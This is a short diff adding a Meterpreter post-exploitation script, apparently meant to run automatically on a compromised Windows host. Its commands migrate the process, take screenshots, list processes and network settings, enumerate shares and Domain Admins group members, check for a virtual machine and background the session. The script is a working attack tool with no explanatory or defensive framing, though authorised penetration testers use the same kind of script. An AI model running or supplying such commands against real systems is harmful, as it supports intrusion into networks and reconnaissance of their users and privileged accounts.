@@ -1,0 +1,10 @@
+run migrate -f
+screenshot -v false
+ps
+ipconfig
+sysinfo
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_domain_group_users  group="Domain Admins"
+run post/windows/gather/checkvm
+screenshot -v false
+background
